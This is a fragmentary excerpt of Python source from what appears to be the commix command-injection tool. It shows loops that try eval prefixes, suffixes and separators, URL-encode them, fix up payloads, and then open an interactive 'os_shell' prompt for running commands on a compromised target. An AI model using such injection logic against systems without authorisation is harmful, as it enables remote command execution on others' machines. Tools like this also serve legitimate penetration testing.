    ...
    for prefix in settings.EVAL_PREFIXES:
      for suffix in settings.EVAL_SUFFIXES:
        for separator in settings.EVAL_SEPARATORS:
          if whitespace == " ":
            whitespace = urllib.parse.quote(whitespace) 
          ...
          if not settings.LOAD_SESSION:
            ...
            try:
              ...
              suffix = urllib.parse.quote(suffix)
              # Fix prefixes / suffixes
              payload = parameters.prefixes(payload, prefix)
              payload = parameters.suffixes(payload, suffix)

              # Fixation for specific payload.
              if ")%3B" + urllib.parse.quote(")}") in payload:
                payload = payload.replace(")%3B" + urllib.parse.quote(")}"), ")" + urllib.parse.quote(")}"))
                #payload = payload + TAG + ""
              ...
              if gotshell in settings.CHOICE_YES:
                ...
                while True:
                  try:
                    ...
                    cmd = input("""commix(""" + Style.BRIGHT + Fore.RED + """os_shell""" + Style.RESET_ALL + """) > """)
